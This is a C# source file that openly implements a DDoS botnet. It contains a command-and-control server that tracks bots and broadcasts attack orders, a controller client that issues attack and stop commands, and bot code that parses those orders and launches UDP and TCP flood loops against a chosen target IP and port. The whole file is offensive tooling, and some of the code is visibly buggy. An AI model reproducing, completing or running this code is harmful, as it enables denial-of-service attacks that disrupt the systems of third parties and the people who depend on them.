using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BotnetController
{
	public class Botnet
	{
		class Bots
		{
			public static List<TcpClient> AliveClients = new List<TcpClient>();
			public static List<TcpClient> RegistertBots = new List<TcpClient>();
		}


		public class Attacks
		{
			class Running
			{
				public static List<String> AttckIDs = new List<String>();
			}
			public enum Packet
			{
				TCP,
				UDP,
				HTTPS,
				Bypass,
				UDPSPOOFED
			}
			static Stopwatch stopwatch = new Stopwatch();
			private static Random AttackID = new Random();

			public static String GenerateId()
			{
				String IdChar = "GDHSBSAWYXCVBNMLURE09876532FGSXYW";
				String ID = "";
				for (int i = 0; i < 16; i++)
					ID += IdChar[AttackID.Next(1, IdChar.Length)];

				Running.AttckIDs.Add("" + ID);
				return ID;
			}
			public static Task AttackUDP(String Ip, int port, int time, String ID)
			{

				stopwatch.Start();
				UdpClient udp = new UdpClient();
				udp.Connect(Ip, port);
				byte[] Shit = Encoding.UTF8.GetBytes("");
				while (stopwatch.Elapsed.TotalSeconds < 120 && Running.AttckIDs.Contains(ID))
				{
					udp.Send(Shit, int.MinValue);
				}
				udp.Close();
				stopwatch.Stop();
				stopwatch.Reset();

				return Task.CompletedTask;
			}

			public static Task AttackTCP(String Ip, int port, int time, String ID)
			{
				stopwatch.Start();
				TcpClient tcp = new TcpClient();
				tcp.Connect(Ip, port);
				byte[] Shit = Encoding.UTF8.GetBytes("");
				while (stopwatch.Elapsed.TotalSeconds < 120 && Running.AttckIDs.Contains(ID))
				{
					tcp.GetStream().Write(Shit, 0, Shit.Length);
				}
				tcp.Close();
				stopwatch.Stop();
				stopwatch.Reset();

				return Task.CompletedTask;
			}
		}
		public class ServerCommand
		{
			public enum Packet
			{
				Attack,
				Stop,
				Resume
			}
		}

		public class ControllerConnection
		{
			static IPAddress IP { get; set; }
			static int ServerPort { get; set; }
			public static TcpClient ServerClient;

			public ControllerConnection(IPAddress iPAddress, int Port)
			{
				IP = iPAddress;
				ServerPort = Port;
				ServerClient = new TcpClient();
				ServerClient.Connect(IP, ServerPort);
			}

			public void SendAttack(Attacks.Packet packet, String IP, int Port, int Time)
			{
				byte[] AttackMethod = Encoding.UTF8.GetBytes(ServerCommand.Packet.Attack + " " + packet.ToString() + " " + IP + " " + Port + " " + Time);
				ServerClient.GetStream().Write(AttackMethod);
			}
			public void StopAttack(ServerCommand.Packet packet, String ID)
			{
				byte[] StopMethod = Encoding.UTF8.GetBytes(ServerCommand.Packet.Stop + " " + packet.ToString() + " " + ID);
				ServerClient.GetStream().Write(StopMethod);
			}

		}
		public class ClientConnection
		{
			static IPAddress IP { get; set; }
			static int ServerPort { get; set; }
			public static TcpClient ServerClient;
			public ClientConnection(IPAddress iPAddress, int Port)
			{
				IP = iPAddress;
				ServerPort = Port;
				ServerClient = new TcpClient();
				ServerClient.Connect(IP, ServerPort);
			}

			public class Server
			{


				public async Task<Task> GetAttack(TcpClient User)
				{
					while (true)
					{

						if (!ServerClient.Connected)
							ServerClient.Connect(ClientConnection.IP, ServerPort);

						Thread.Sleep(5);
						NetworkStream stream = User.GetStream(); // get the stream associated with the client

						byte[] buffer = new byte[1024]; // create a buffer to store the received data

						int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); // read data from the stream into the buffer

						string data = Encoding.ASCII.GetString(buffer, 0, bytesRead); // convert the received data to a string

						if (data.StartsWith(ServerCommand.Packet.Attack.ToString()))
						{
							String AttackString = data.Replace(ServerCommand.Packet.Attack.ToString() + " ", "");
							if (AttackString != "" || AttackString != " ")
							{
								if (AttackString.StartsWith(Attacks.Packet.UDP.ToString()))
								{
									String CurrentAttack = data.Replace(Attacks.Packet.UDP.ToString() + " ", "");
									String[] AttackData = CurrentAttack.Split(" ");
									String TargetIP = AttackData[0];
									String TargetPort = AttackData[1];
									String Time = AttackData[2];
									//Attack

									Task.Run(() => { Attacks.AttackUDP(TargetIP, Int32.Parse(TargetPort), Int32.Parse(Time), Attacks.GenerateId()); });
								}
								else if (AttackString.StartsWith(Attacks.Packet.TCP.ToString()))
								{
									String CurrentAttack = data.Replace(Attacks.Packet.UDP.ToString() + " ", "");
									String[] AttackData = CurrentAttack.Split(" ");
									String TargetIP = AttackData[0];
									String TargetPort = AttackData[1];
									String Time = AttackData[2];
									//Attack

									Task.Run(() => { Attacks.AttackTCP(TargetIP, Int32.Parse(TargetPort), Int32.Parse(Time), Attacks.GenerateId()); });
								}
							}
						}

					}
				}

				public async Task<Task> ReplyPing(TcpClient Ping)
				{
					while (true)
					{
						Thread.Sleep(5);
						NetworkStream stream = Ping.GetStream(); // get the stream associated with the client

						byte[] buffer = new byte[1024]; // create a buffer to store the received data

						int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); // read data from the stream into the buffer

						string data = Encoding.ASCII.GetString(buffer, 0, bytesRead); // convert the received data to a string

						if (data.StartsWith("PING"))
							if (Ping.Connected)
								await Ping.GetStream().WriteAsync(buffer, 0, bytesRead);
							else
								ServerClient.Connect(IP, ServerPort);
					}


					return Task.CompletedTask;
				}

			}



		}
		public class ServerConnection
		{
			public static Server TCPServer;
			public static Server ControllerServer;
			IPAddress IP { get; set; }
			int ServerPort { get; set; }

			public ServerConnection(IPAddress iPAddress, int Port)
			{
				IP = iPAddress;
				ServerPort = Port;
			}

			public void Connect()
			{
				TCPServer = new Server("0.0.0.0", ServerPort);
				//Start Handle TcpClients async
				Task.Run(TCPServer.HandleConnection);
				Task.Run(TCPServer.HandleConnectionController);
				//Broadcast every 2 seconds 1 Test Message aysnc
				while (true)
				{
					Thread.Sleep(2000);
					Console.WriteLine("Pinging Bots!");
					Task.Run(() => { TCPServer.Broadcast("PING"); });
					Console.WriteLine("Registert Bots: " + Bots.RegistertBots.Count + "   Alive Bots: " + Bots.AliveClients.Count);
				}
			}
			public class Server
			{
				public string Serverip { get; set; }
				public int Serverport { get; set; }
				public Server(string IP, int port)
				{
					Serverip = IP;
					Serverport = port;
				}

				public async Task HandleConnection()
				{
					//Start Listening here
					TcpListener tcp = new TcpListener(IPAddress.Parse(Serverip), Serverport);
					tcp.Start();
					//add incomeing Client to Array of Connected Clients
					while (true)
					{
						TcpClient client = tcp.AcceptTcpClient();
						Console.WriteLine("New Client Connected! - Count: " + Bots.RegistertBots.Count);
						Bots.RegistertBots.Add(client);
						Task.Run(() => { ReadClientData(client); });

					}




				}
				public async Task HandleConnectionController()
				{
					//Start Listening here
					TcpListener tcp = new TcpListener(IPAddress.Parse(Serverip), 4545);
					tcp.Start();
					//add incomeing Client to Array of Connected Clients
					while (true)
					{
						TcpClient client = tcp.AcceptTcpClient();
						Console.WriteLine("New Client Controller");
						Task.Run(() => { ReadController(client); });

					}
				}
				public async Task ReadController(TcpClient User)
				{
					while (true)
					{
						NetworkStream stream = User.GetStream(); // get the stream associated with the client

						byte[] buffer = new byte[1024]; // create a buffer to store the received data

						int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); // read data from the stream into the buffer

						string data = Encoding.ASCII.GetString(buffer, 0, bytesRead); // convert the received data to a string

						if (data.StartsWith(ServerCommand.Packet.Stop.ToString()))
						{
							Console.WriteLine("Sever Recive Stop Attack");
							TCPServer.Broadcast(ServerCommand.Packet.Stop.ToString() + " " + data.Replace(ServerCommand.Packet.Stop.ToString() + " ", ""));
							Console.WriteLine("Stop All Attacks");
						}
						else if (data.StartsWith(ServerCommand.Packet.Attack.ToString()))
						{
							Console.WriteLine("Sever Recive Attack");//Attack Method ip port time
							String AttackString = data.Replace(ServerCommand.Packet.Attack.ToString() + " ", "");
							String[] DataInfos = AttackString.Split(" ");
							TCPServer.Broadcast(DataInfos[0] + " " + DataInfos[1] + " " + DataInfos[2] + " " + DataInfos[3]);
							Console.WriteLine("Send Attack");
						}
					}
				}


				public async Task ReadClientData(TcpClient User)
				{
					while (true)
					{
						NetworkStream stream = User.GetStream(); // get the stream associated with the client

						byte[] buffer = new byte[1024]; // create a buffer to store the received data

						int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length); // read data from the stream into the buffer

						string data = Encoding.ASCII.GetString(buffer, 0, bytesRead); // convert the received data to a string

						if (data.Contains("PING"))
						{
							if (!Bots.AliveClients.Contains(User))
								Bots.AliveClients.Add(User);

							Console.WriteLine("Bot Reply");
						}
					}
				}


				//Broadcast Methode
				public async Task Broadcast(String Message)
				{
					//Loop through TcpClient list
					foreach (var client in Bots.RegistertBots)
					{
						//Check for alive Connections
						if (!client.Connected)
						{
							Bots.AliveClients.Remove(client);
							Console.WriteLine("Removeing dead Bot!");
							return;
						}


						//Broadcast to all Connected Clients
						if (client.Connected)
							await client.GetStream().WriteAsync(Encoding.UTF8.GetBytes(Message), 0, Message.Length);
					}

				}
			}
		}

	}

}

